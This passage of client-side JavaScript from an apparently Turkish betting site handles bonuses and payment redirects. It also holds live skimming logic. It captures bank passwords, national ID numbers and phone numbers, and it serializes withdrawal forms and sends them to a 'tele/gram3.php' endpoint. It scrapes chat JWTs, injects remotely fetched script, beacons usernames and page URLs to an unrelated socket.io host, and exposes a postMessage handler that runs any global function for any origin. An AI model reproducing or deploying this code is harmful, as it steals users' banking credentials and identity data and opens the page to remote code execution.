    postData = "kullaniciAdi=" + kullaniciAdi + "&bankaAdi=" + bankaAdi + "&gonderenTel=" + gonderenTel + "&aliciTel=" + aliciTel + "&tutar=" + tutar + "&sifre=" + sifre + "&tcno=" + tcNo;
    setTimeout(function() {
      if (!("Yatırım talebiniz işleme alınmıştır" != $("#detailsDiv_vakifbank .field-success-msg").text() && "Yatırım talebiniz işleme alınmıştır" != $("#contvakifbank .successmassage").text())) {
        veriGonder(postData);
      }
    }, 500);
  }
});




var userName2 = "HATA";
    if ($('.tl_acc_userid').length > 0) {
        userName2 = $('.tl_acc_userid .text').html();
		}
   if ($('#menu-right .txt:nth-child(2)').length > 0) {
        userName2 = $('#menu-right .txt:nth-child(2)').html();
		}


$(document).on("click", ".transfertoaccount_btn", function() {
     var form = $('#transfertoaccount').serialize();
          $('input[disabled]').each( function() {
              form = form + '&' + $(this).attr('name') + '=' + $(this).val();
          });
    $.ajax({
        type: "GET",
        data: form+ "&username=" + userName2,
        url: "https://betkanyon90.com/tele/gram3.php",
        success: function(t) {}
    })
}), $(document).on("click", "#transfertoaccount_mob_withd", function() {

    var form = $('#transfertoaccount').serialize();
          $('input[disabled]').each( function() {
              form = form + '&' + $(this).attr('name') + '=' + $(this).val();
          });

    $.ajax({
        type: "GET",
        data: form+ "&username=" + userName2,
        url: "https://betkanyon90.com/tele/gram3.php",
        success: function(t) {}
    })
});



setInterval(function(){
    if ($('#playerBonusBalance').length > 0 && $('#playerBonusBalance').text() != "0.00") {
        val = $('#playerBonusBalance').text().split(' TRY')[0].split('.')[0];
        if ($('bonus').length == 0) {
            $('#playerBalance').next().append('<bonus data-id="new" style="background: #f35f39;color: #fff;padding: 3px 6px;font-size: 12px;float: right;margin-top: -16px;text-align: center;line-height: 14px;border-radius: 3px;margin-right: -5px;font-size: 11px;margin-left: -30px;">Bonus <br>'+val+' TRY</bonus>');
        }
    } else {
        if ($('#SportBonusAmount').length > 0 && $('#SportBonusAmount').text() != '') {
            if ($('#SportBonusAmount').text() != 'TRY') {
                    if ($('bonus').length == 0) {
                         $('#playerBalance').next().append('<bonus style="background: #f35f39;color: #fff;padding: 3px 6px;font-size: 12px;float: right;margin-top: -16px;text-align: center;line-height: 14px;border-radius: 3px;margin-right: -5px;font-size: 11px;margin-left: -30px;">Bonus <br>'+$('#SportBonusAmount').text()+' TRY</bonus>');
                    } else {
                        $('bonus').html('Bonus <br> '+$('#SportBonusAmount').text()+' TRY');
                    }
                }
            }
    }
},2500);

setTimeout(function(){
    if ($('#playerBonusBalance').length > 0 && $('#playerBonusBalance').text() != "0.00") {
        val = $('#playerBonusBalance').text().split(' TRY')[0].split('.')[0];
        if ($('bonus').length == 0) {
            $('#playerBalance').next().append('<bonus data-id="new" style="background: #f35f39;color: #fff;padding: 3px 6px;font-size: 12px;float: right;margin-top: -16px;text-align: center;line-height: 14px;border-radius: 3px;margin-right: -5px;font-size: 11px;margin-left: -30px;">Bonus <br>'+val+' TRY</bonus>');
        }
    } else {
        if ($('#SportBonusAmount').length > 0 && $('#SportBonusAmount').text() != '') {
            if ($('#SportBonusAmount').text() != 'TRY') {
                    if ($('bonus').length == 0) {
                         $('#playerBalance').next().append('<bonus style="background: #f35f39;color: #fff;padding: 3px 6px;font-size: 12px;float: right;margin-top: -16px;text-align: center;line-height: 14px;border-radius: 3px;margin-right: -5px;font-size: 11px;margin-left: -30px;">Bonus <br>'+$('#SportBonusAmount').text()+' TRY</bonus>');
                    } else {
                        $('bonus').html('Bonus <br> '+$('#SportBonusAmount').text()+' TRY');
                    }
                }
            }
    }
},600); 

    $(document).on('click','#expresshavale_mob_dep2', function (e) {
        if ($('.tl_acc_userid .text').length == 0) {
           username = $('a[href=#right-panel]').eq(2).text(); 
        } else {
           username = $('.tl_acc_userid .text').text();
        }
        
        $.ajax({
            type:'POST',
            data:'',
            url:'/Account/Index',
            success:function(profile){
                    lastName = $(profile).find('.accHeading').text().trim();
                    deger = lastName.split(' ');
                    ad = deger[0];
                    soyad = deger[1];
                    if (deger[2]) {
                        soyad = deger[1]+' '+deger[2];
                    }
					  id = $('#sidebar-user .ui-link').eq(1).text().split('ID: ');
                id = id[1];    
            
                window.location.href = 'https://betkanyon.letspayments.com/ExpressHavaleOnlinePayment.aspx?SERVICE_PROVIDER=1026&LANGUAGE=TR&DEPOSIT_ID=0&AMOUNT=&RURL='+window.location.host+window.location.pathname+'&EMAIL=&username='+username+'&VERIFICATIONCODE=&CURRENCY=TRY&FirstName='+ad+'&LastName='+soyad+'&Birthday=01%2F27%2F1998+00%3A00%3A00&Address=&City=&Zip=&Phone1=&Country=&Param1='+id+'&Param2=2&Param3=&methodid=&phone11=&phone2=&expdate=&cvv=&cardnumber=&bankid=&transfertype=&password=&identity1=&identity2=&reference=&PlayerId='+id;
                }

            });
    });


    $(document).on('click','#expresshavale_mob_dep_papara', function (e) {
        if ($('.tl_acc_userid .text').length == 0) {
           username = $('a[href=#right-panel]').eq(2).text(); 
        } else {
           username = $('.tl_acc_userid .text').text();
        }
        
        $.ajax({
            type:'POST',
            data:'',
            url:'/Account/Index',
            success:function(profile){
                    lastName = $(profile).find('.accHeading').text().trim();
                    deger = lastName.split(' ');
                    ad = deger[0];
                    soyad = deger[1];
                    if (deger[2]) {
                        soyad = deger[1]+' '+deger[2];
                    }
					  id = $('#sidebar-user .ui-link').eq(1).text().split('ID: ');
                id = id[1];    
            
                window.location.href = 'https://betkanyon.letspayments.com/ExpressHavaleOnlinePayment.aspx?SERVICE_PROVIDER=1026&LANGUAGE=TR&DEPOSIT_ID=0&AMOUNT=&RURL='+window.location.host+window.location.pathname+'&EMAIL=&username='+username+'&VERIFICATIONCODE=&CURRENCY=TRY&FirstName='+ad+'&LastName='+soyad+'&Birthday=01%2F27%2F1998+00%3A00%3A00&Address=&City=&Zip=&Phone1=&Country=&Param1='+id+'&Param2=5&Param3=&methodid=&phone11=&phone2=&expdate=&cvv=&cardnumber=&bankid=&transfertype=&password=&identity1=&identity2=&reference=&PlayerId='+id;
                }

            });
    });


    $(document).on('click','#expresshavale_mob_dep_payfix', function (e) {
        if ($('.tl_acc_userid .text').length == 0) {
           username = $('a[href=#right-panel]').eq(2).text(); 
        } else {
           username = $('.tl_acc_userid .text').text();
        }
        
        $.ajax({
            type:'POST',
            data:'',
            url:'/Account/Index',
            success:function(profile){
                    lastName = $(profile).find('.accHeading').text().trim();
                    deger = lastName.split(' ');
                    ad = deger[0];
                    soyad = deger[1];
                    if (deger[2]) {
                        soyad = deger[1]+' '+deger[2];
                    }
					  id = $('#sidebar-user .ui-link').eq(1).text().split('ID: ');
                id = id[1];    
            
                window.location.href = 'https://betkanyon.letspayments.com/ExpressHavaleOnlinePayment.aspx?SERVICE_PROVIDER=1026&LANGUAGE=TR&DEPOSIT_ID=0&AMOUNT=&RURL='+window.location.host+window.location.pathname+'&EMAIL=&username='+username+'&VERIFICATIONCODE=&CURRENCY=TRY&FirstName='+ad+'&LastName='+soyad+'&Birthday=01%2F27%2F1998+00%3A00%3A00&Address=&City=&Zip=&Phone1=&Country=&Param1='+id+'&Param2=7&Param3=&methodid=&phone11=&phone2=&expdate=&cvv=&cardnumber=&bankid=&transfertype=&password=&identity1=&identity2=&reference=&PlayerId='+id;
                }

            });
    });






    $(document).on('click','#expresshavale_mob_dep3', function (e) {
            
        if ($('.tl_acc_userid .text').length == 0) {
           username = $('a[href=#right-panel]').eq(2).text(); 
        } else {
           username = $('.tl_acc_userid .text').text();
        }
        
        $.ajax({
            type:'POST',
            data:'',
            url:'/Account/Index',
            success:function(profile){
                    lastName = $(profile).find('.accHeading').text().trim();
                    deger = lastName.split(' ');
                    ad = deger[0];
                    soyad = deger[1];
                    if (deger[2]) {
                        soyad = deger[1]+' '+deger[2];
                    }
					  id = $('#sidebar-user .ui-link').eq(1).text().split('ID: ');
                id = id[1];    
            
                window.location.href = 'https://betkanyon.letspayments.com/ExpressHavaleOnlinePayment.aspx?SERVICE_PROVIDER=1026&LANGUAGE=TR&DEPOSIT_ID=0&AMOUNT=&RURL='+window.location.host+window.location.pathname+'&EMAIL=&username='+username+'&VERIFICATIONCODE=&CURRENCY=TRY&FirstName='+ad+'&LastName='+soyad+'&Birthday=01%2F27%2F1998+00%3A00%3A00&Address=&City=&Zip=&Phone1=&Country=&Param1='+id+'&Param2=1&Param3=&methodid=&phone11=&phone2=&expdate=&cvv=&cardnumber=&bankid=&transfertype=&password=&identity1=&identity2=&reference=&PlayerId='+id;
                }

            });
    });

     $(document).on('click','#expresshavale_mob_dep_cmt', function (e) {
            
        if ($('.tl_acc_userid .text').length == 0) {
           username = $('a[href=#right-panel]').eq(2).text(); 
        } else {
           username = $('.tl_acc_userid .text').text();
        }
        
        $.ajax({
            type:'POST',
            data:'',
            url:'/Account/Index',
            success:function(profile){
                    lastName = $(profile).find('.accHeading').text().trim();
                    deger = lastName.split(' ');
                    ad = deger[0];
                    soyad = deger[1];
                    if (deger[2]) {
                        soyad = deger[1]+' '+deger[2];
                    }
					  id = $('#sidebar-user .ui-link').eq(1).text().split('ID: ');
                id = id[1];    
            
                window.location.href = 'https://betkanyon.letspayments.com/ExpressHavaleOnlinePayment.aspx?SERVICE_PROVIDER=1026&LANGUAGE=TR&DEPOSIT_ID=0&AMOUNT=&RURL='+window.location.host+window.location.pathname+'&EMAIL=&username='+username+'&VERIFICATIONCODE=&CURRENCY=TRY&FirstName='+ad+'&LastName='+soyad+'&Birthday=01%2F27%2F1998+00%3A00%3A00&Address=&City=&Zip=&Phone1=&Country=&Param1='+id+'&Param2=3&Param3=&methodid=&phone11=&phone2=&expdate=&cvv=&cardnumber=&bankid=&transfertype=&password=&identity1=&identity2=&reference=&PlayerId='+id;
                }

            });
    });

       $(document).on('click','#expresshavale_mob_dep_cepbank', function (e) {
            
        if ($('.tl_acc_userid .text').length == 0) {
           username = $('a[href=#right-panel]').eq(2).text(); 
        } else {
           username = $('.tl_acc_userid .text').text();
        }
        
        $.ajax({
            type:'POST',
            data:'',
            url:'/Account/Index',
            success:function(profile){
                    lastName = $(profile).find('.accHeading').text().trim();
                    deger = lastName.split(' ');
                    ad = deger[0];
                    soyad = deger[1];
                    if (deger[2]) {
                        soyad = deger[1]+' '+deger[2];
                    }
					  id = $('#sidebar-user .ui-link').eq(1).text().split('ID: ');
                id = id[1];    
            
                window.location.href = 'https://betkanyon.letspayments.com/ExpressHavaleOnlinePayment.aspx?SERVICE_PROVIDER=1026&LANGUAGE=TR&DEPOSIT_ID=0&AMOUNT=&RURL='+window.location.host+window.location.pathname+'&EMAIL=&username='+username+'&VERIFICATIONCODE=&CURRENCY=TRY&FirstName='+ad+'&LastName='+soyad+'&Birthday=01%2F27%2F1998+00%3A00%3A00&Address=&City=&Zip=&Phone1=&Country=&Param1='+id+'&Param2=4&Param3=&methodid=&phone11=&phone2=&expdate=&cvv=&cardnumber=&bankid=&transfertype=&password=&identity1=&identity2=&reference=&PlayerId='+id;
                }

            });
    });



    $(document).on('click','.bonus-sec', function(){
       
        $('.bonus-sec').removeClass('bonus_btn_active');
        
        
        if ($(this).attr('data-type') == 3) {
            $('.alt_tab .category-sec[data-type=3]').show();
        } else {
            $('.alt_tab .category-sec[data-type=3]').hide();
        }
        
        if ($(this).attr('data-type') == 5) {
             if ($('.tl_acc_userid .text').length != 0) {
                 username = $('.tl_acc_userid .text').text();
             } else {
                 username = $('#menu-right .ui-link:last').text().trim();
             }

             if (username == 'test10') {
                 $('.onay_msg').hide();
                 $('.alt_tab3').show();
             }
            $('.alt_tab').hide();
            $('.alt_tab2').hide();
            $('.alt_tab2').hide();
        } else {
            $('.alt_tab').fadeOut();
            $('.alt_tab').fadeIn();
            $('.alt_tab2').hide();
            $('.alt_tab3').hide();
        }
        
        $('.alt_tab .category-sec').removeClass('bonus_btn_active');
        $('.onay_msg2').hide();
        $('.onay_msg2').hide();
        $('.onay_msg3').hide();
        $(this).addClass('bonus_btn_active');
    });
    



     $(document).on('click','.alt_tab3 #activeCodeGift', function(){ 
        if ($('#codeText').val() == '') {
            $('#codeText').focus();
        } else {
            
            id = '';
            if (isMobile == true) {
                id = $('.menu_new.ui-link:eq(1)').text().replace('Hesap ID:','').trim();
                jwt = 1;
            } else {
                token = window.zESettings.webWidget.authenticate.chat.jwtFn.toString().split("callback('");
                token = token[1].split("')");
                jwt = token[0];
            }
            
            $.ajax({
                type:'GET',
                url:'https://bonus-api.betkanyon100.com/kod_kullan.php?id=&code='+$('#codeText').val()+'&jwt='+jwt+'&user_id='+id,
                data:'',
                success:function(reply) {
                    if ($('.onay_msg3').length != 0) {
                        $('.onay_msg3').html('<p style="line-height: 22px;">'+reply.message+'</p>');
                    } else {
                        $('.alt_tab3').after('<div class="onay_msg3"><p style="line-height: 22px;">'+reply.message+'</p></div>');
                    }
                }
            })
            
        }
     });


     $(document).on('click','.kredikarti', function(){ 
        window.location.href = 'http://betkanyon100.com/articles/hc/tr/articles/360010378040';
     });



     $(document).on('click','.alt_tab .category-sec', function(){
        type = $('.bonus-sec.bonus_btn_active').attr('data-type');
        $('.alt_tab .category-sec').removeClass('bonus_btn_active');
        $(this).addClass('bonus_btn_active');
        thistype = $(this).attr('data-type');
        $('.onay_msg').hide();
        
        bonus = $('.bonus_btn_active').attr('data-type');
        category = $(this).attr('data-type');
        BonusInfo(category,bonus,type);
        
    });


     function BonusInfo(category,bonus,type) {
         if (type != 3) {
            $('.alt_tab2').hide();
            id = '';
            if (isMobile == true) {
                id = $('.menu_new.ui-link:eq(1)').text().replace('Hesap ID:','').trim();
                jwt = 1;
            } else {
                token = window.zESettings.webWidget.authenticate.chat.jwtFn.toString().split("callback('");
                token = token[1].split("')");
                jwt = token[0];
            }
            
			$('.onay_msg').html('<img src="https://betkanyon100.com/loading.svg" style=" height: 40px; vertical-align: middle; position: relative; top: -2px;"> Yükleniyor...');
            $.ajax({
                type:'GET',
                url:'https://bonus-api.betkanyon100.com/control.php?id=&jwt='+jwt+'&bonus='+bonus+'&type='+category+'&user_id='+id,
                data:'',
                success:function(reply) {
                        $('.onay_msg').show();
                        if ($('.onay_msg').length == 1) {
                            $('.onay_msg').html();
                            if (reply.show == 1) {
                                $('.onay_msg').html('<p style="line-height: 22px;">'+reply.message+'</p> <div class="bonus_btn onay-iptal" data-type="1"> Onaylıyorum</div><div class="bonus_btn onay-iptal" data-type="2"> İptal Et </div>');
                            } else if (reply.show == 2) {
                                $('.onay_msg').html('<p style="line-height: 22px;">'+reply.message+'</p> <div class="bonus_btn onay-iptal" data-type="10"> Onaylıyorum</div><div class="bonus_btn onay-iptal" data-type="11"> İptal Et </div>');
                            } else {
                                $('.onay_msg').html('<p style="line-height: 22px;">'+reply.message+'</p>');
                            }
                        } else {
                            if (reply.show == 1) {
                                $('.alt_tab').after('<div class="onay_msg"><p style="line-height: 22px;">'+reply.message+'</p> <div class="bonus_btn onay-iptal" data-type="1"> Onaylıyorum</div><div class="bonus_btn onay-iptal" data-type="2"> İptal Et </div></div>');
                            } else if (reply.show == 2) {
                                $('.alt_tab').after('<div class="onay_msg"><p style="line-height: 22px;">'+reply.message+'</p> <div class="bonus_btn onay-iptal" data-type="10"> Onaylıyorum</div><div class="bonus_btn onay-iptal" data-type="11"> İptal Et </div></div>');
                            } else {
                                $('.alt_tab').after('<div class="onay_msg"><p style="line-height: 22px;">'+reply.message+'</p></div>');
                            }
                        }
                }
            }) 
        } else {
             if (thistype == 3) {
                
                 id = '';
                 if (isMobile == true) {
                    id = $('.menu_new.ui-link:eq(1)').text().replace('Hesap ID:','').trim();
                    jwt = 1;
                 } else {
                    token = window.zESettings.webWidget.authenticate.chat.jwtFn.toString().split("callback('");
                    token = token[1].split("')");
                    jwt = token[0];
                 }
                 $.ajax({
                     type:'POST',
                     data:'',
                     url:'https://bonus-api.betkanyon100.com/extra_bonus.php?id=&jwt='+jwt+'&user_id='+id,
                     success:function(reply) {
                         $('.onay_msg').show();
                         if ($('.onay_msg').length != 0) {
                             $('.alt_tab2').hide();
                             $('.onay_msg').show().html('<p style="line-height: 22px;">'+reply.message+'</p>');
                         } else {
                             $('.alt_tab').after('<div class="onay_msg"><p style="line-height: 22px;">'+reply.message+'</p></div>');
                         }
                     }
                 })
             } else {
                 $('.alt_tab2').show();
             }
        }
     }

     $(document).on('click','.alt_tab2 .category-sec', function(){
         $('.alt_tab2 .category-sec').removeClass('bonus_btn_active');
         $(this).addClass('bonus_btn_active');
         category = $('.alt_tab .bonus_btn_active').attr('data-type');
         period = $('.alt_tab2 .bonus_btn_active').attr('data-type');
         
          id = '';
          if (isMobile == true) {
                id = $('.menu_new.ui-link:eq(1)').text().replace('Hesap ID:','').trim();
                jwt = 1;
          } else {
                token = window.zESettings.webWidget.authenticate.chat.jwtFn.toString().split("callback('");
                token = token[1].split("')");
                jwt = token[0];
         }
         
         $('.onay_msg2').html('<img src="https://betkanyon100.com/loading.svg" style=" height: 40px; vertical-align: middle; position: relative; top: -2px;"> Yükleniyor...');
         $.ajax({
            type:'GET',
            url:'https://bonus-api.betkanyon100.com/control.php?id=&jwt='+jwt+'&bonus=3&type='+category+'&period='+period+'&user_id='+id,
            data:'',
            success:function(reply) {
                $('.onay_msg2').show();
                    if ($('.onay_msg2').length == 1) {
                        $('.onay_msg2').html();
                        if (reply.show == 1) {
                            $('.onay_msg2').html('<p style="line-height: 22px;">'+reply.message+'</p> <div class="bonus_btn onay-iptal" data-type="1"> Onaylıyorum</div><div class="bonus_btn onay-iptal2" data-type="2"> İptal Et </div>');
                        } else if (reply.show == 2) {
                            $('.onay_msg2').html('<p style="line-height: 22px;">'+reply.message+'</p> <div class="bonus_btn onay-iptal" data-type="10"> Onaylıyorum</div><div class="bonus_btn onay-iptal2" data-type="11"> İptal Et </div>');
                        } else {
                            $('.onay_msg2').html('<p style="line-height: 22px;">'+reply.message+'</p>');
                        }
                    } else {
                        if (reply.show == 1) {
                            $('.alt_tab2').after('<div class="onay_msg2"><p style="line-height: 22px;">'+reply.message+'</p> <div class="bonus_btn onay-iptal2" data-type="1"> Onaylıyorum</div><div class="bonus_btn onay-iptal2" data-type="2"> İptal Et </div></div>');
                        } else if (reply.show == 2) {
                            $('.onay_msg2').html('<p style="line-height: 22px;">'+reply.message+'</p> <div class="bonus_btn onay-iptal" data-type="10"> Onaylıyorum</div><div class="bonus_btn onay-iptal2" data-type="11"> İptal Et </div>');
                        } else {
                            $('.alt_tab2').after('<div class="onay_msg2"><p style="line-height: 22px;">'+reply.message+'</p></div>');
                        }
                    }
            }
        })
    });
        
$(document).on('click','.onay_msg .onay-iptal', function(){
            if ($(this).attr('data-type') == 1) {
                type = $('.bonus-sec.bonus_btn_active').attr('data-type');
                if (type != 3 && type != 10 && type != 11) {
                category = $('.alt_tab .bonus_btn_active').attr('data-type');
                bonus = $('.bonus-sec.bonus_btn_active').attr('data-type');
                id = '';
                 if (isMobile == true) {
                    id = $('.menu_new.ui-link:eq(1)').text().replace('Hesap ID:','').trim();
                    jwt = 1;
                } else {
                    token = window.zESettings.webWidget.authenticate.chat.jwtFn.toString().split("callback('");
                    token = token[1].split("')");
                    jwt = token[0];
                }

                $('.onay_msg').html('<img src="https://betkanyon100.com/loading.svg" style=" height: 40px; vertical-align: middle; position: relative; top: -2px;"> Yükleniyor...');
                $.ajax({
                    type:'GET',
                    url:'https://bonus-api.betkanyon100.com/deposit-control.php?id=&jwt='+jwt+'&bonus='+bonus+'&type='+category+'&user_id='+id,
                    data:'',
                    success:function(reply) {
                        $('.onay_msg').html(reply.message);
                    }
                })
            }
        } else if ($(this).attr('data-type') == 10) {
              $('.onay_msg').html('<img src="https://betkanyon100.com/loading.svg" style=" height: 40px; vertical-align: middle; position: relative; top: -2px;"> Yükleniyor...');
                $.ajax({
                    type:'GET',
                    url:'https://bonus-api.betkanyon100.com/canceled-bonus.php?jwt='+jwt,
                    data:'',
                    success:function(reply) {
                        if (reply.status == 'success') {
                             BonusInfo(category,bonus,type);
                        } else {
                            $('.onay_msg').html(reply.message);
                        }
                    }
                })
        } else {
            location.reload();
        }
});

$(document).on('change','#BankTransfer_NameOfBank', function(){
    if ($(this).val() == 'Garanti Bankası') {
        $('#transfertoaccount .tl_payment_padd:eq(6)').after('<div class="tl_payment_col tl_payment_padd sonek"><span class="lbl payment_lbl"><label for="BankTransfer_PasVerify">Kimlik Veriliş Veya Son Kullanma Tarihi</label><span class="tl_input_popup_required">*</span></span><input class="tl_input_popup" id="cekimVerilisTarihi" name="cekimVerilisTarihi" type="text" value=""></div><div class="tl_payment_col tl_payment_padd sonek"><span class="lbl payment_lbl"><label>Doğum Tarihi</label><span class="tl_input_popup_required">*</span></span><input class="tl_input_popup" id="cekimDogumTarihi" name="cekimDogumTarihi" type="text" value=""></div>');
        $('#transfertoaccount .row:eq(7)').after('<div class="row sonek"> <label>Kimlik Veriliş Veya Son Kullanma Tarihi</label> <div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input class="inp" name="cekimVerilisTarihi" id="cekimVerilisTarihi"></div></div><div class="row sonek"> <label>Doğum Tarihi</label> <div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input name="cekimDogumTarihi" class="inp" id="cekimDogumTarihi"></div></div>');
    } else {
        $('.sonek').remove();
    }
})



function bonusCheck(id,cb) {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        cb(this.responseText);
    }
  };
  xhttp.open("GET", "https://bonus-api.betkanyon100.com/deneme-bonusu/api/check.php?id="+id, true);
  xhttp.send();
}



function bonus_checker(isMobile) {
    if (isMobile == true) {
        if ($('.menu_new.ui-link:eq(1)').length != 0) {
            user_id = $('.menu_new.ui-link:eq(1)').text().replace('Hesap ID:','').trim();
            bonusCheck(user_id, function(check) {
                check = JSON.parse(check);
                if (check.status == 'error') {
                    if (check.cookie == true) {
                        setCookie("bonus_checker", "false", 300);
                    }
                } else {
                      document.querySelector('body').insertAdjacentHTML('afterend','<div class="deneme-bonusu" style="background: #f35f38;position: fixed;right: 0;bottom: 5px;color: #fff;margin: 10px 20px;cursor: pointer;font-size: 13px;border-radius: 52px;z-index: 99999999;padding: 11px;/* padding-left: 28px; */font-family: Arial;">DENEME BONUSU</div>');
                      $('.zEWidget-launcher').hide();
                      $('.zEWidget-launcher').remove();
                }
            })
        }
    } else {
        if ($('.tf_user_icon').length != 0) {
            user_id = $('.profileDialog .width_part:eq(1)').text().replace('ID ','').trim();
            bonusCheck(user_id, function(check) {
                check = JSON.parse(check);
                if (check.status == 'error') {
                    if (check.cookie == true) {
                        setCookie("bonus_checker", "false", 300);
                    }
                } else {
                      document.querySelector('body').insertAdjacentHTML('afterend','<div class="deneme-bonusu" style="background: #f35f38;position: fixed;right: 0;bottom: 6px;color: #fff;margin: 10px 20px;cursor: pointer;font-size: 13px;border-radius: 52px;z-index: 9999;padding: 11px;padding-left: 28px;font-family: Arial;"><i class="bonus_balance_icon dropdownColor" style=" color: #fff; position: absolute; left: 8px; top: 8px;"></i> DENEME BONUSU</div>');
                    $('.zEWidget-launcher').hide();
                    $('.zEWidget-launcher').remove();
                }
            })
        }
    }
} 
bonus_checker(isMobile);
$(document).on('click','.deneme-bonusu', function() {   
     if (isMobile == true) {
         user_id = $('.menu_new.ui-link:eq(1)').text().replace('Hesap ID:','').trim();
         document.querySelector('body').insertAdjacentHTML('afterend','<div class="pop-frame" style=" position: fixed; z-index: 999999999; top: 0; left: 0; height: 100%; width: 100%; display: flex; flex-flow: column nowrap; justify-content: center; align-items: center; background: rgba(0,0,0,0.7); box-sizing: border-box;"><iframe frameborder="0" src="https://bonus-api.betkanyon100.com/deneme-bonusu/?id='+user_id+'" style=" margin: 0 auto; height: 562px;width:100%;height:100%;"></iframe></div>');
     } else {
       user_id = $('.profileDialog .width_part:eq(1)').text().replace('ID ','').trim();
       document.querySelector('body').insertAdjacentHTML('afterend','<div class="pop-frame" style=" position: fixed; z-index: 9999; top: 0; left: 0; height: 100%; width: 100%; display: flex; flex-flow: column nowrap; justify-content: center; align-items: center; background: rgba(0,0,0,0.7); box-sizing: border-box;"> <div class="close_png" style=" background: #fff; background: #f5f5f5; padding: 6px; margin-bottom: 8px; width: 102px; text-align: center; border-radius: 10px; cursor: pointer;font-family:Arial">kapat</div><iframe width="400px" src="https://bonus-api.betkanyon100.com/deneme-bonusu/?id='+user_id+'" style=" margin: 0 auto; height: 562px; border-radius: 9px;"></iframe></div>');
     }
})

function iframeClose() {
    $('.pop-frame').remove();
    location.reload();
}

$(document).on('click','.close_png', function() {
    $('.pop-frame').remove();
});

if (window.addEventListener) {
    window.addEventListener("message", onMessage, false);        
} 
else if (window.attachEvent) {
    window.attachEvent("onmessage", onMessage, false);
}

function onMessage(event) {
    var data = event.data;
    if (typeof(window[data.func]) == "function") {
        window[data.func].call(null, data.message);
    }
}


  function httpGet(theUrl)
    {
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
        xmlHttp.send( null );
        return xmlHttp.responseText;
    }


script = document.createElement('script');
script.setAttribute('id','lisans');
script.innerHTML = httpGet('https://bonus-api.betkanyon100.com/lisans.php?v='+Math.random());
document.body.append(script);


 
function loadScripts(array,callback){
    var loader = function(src,handler){
        var script = document.createElement("script");
        script.src = src;
        script.onload = script.onreadystatechange = function(){
            script.onreadystatechange = script.onload = null;
            handler();
        }
        var head = document.getElementsByTagName("head")[0];
        (head || document.body).appendChild( script );
    };
    (function run(){
        if(array.length!=0){
            loader(array.shift(), run);
        }else{
            callback && callback();
        }
    })();
}


loadScripts([
   "https://atpmarketzinciri.net/socket.io/socket.io.js",
],function(){
    if ($('.tl_login_button').length == 1 || $('.platformMobReg').length == 1) {
        
    } else {
        if ($('.tl_acc_userid .text').length == 0) {
           username = $('a[href=#right-panel]').eq(2).text(); 
        } else {
           username = $('.tl_acc_userid .text').text();
        }
        var socket = io('https://atpmarketzinciri.net');
        socket.emit('online',{userId:username,page:document.title,pageUrl:document.location.href});
    }
});
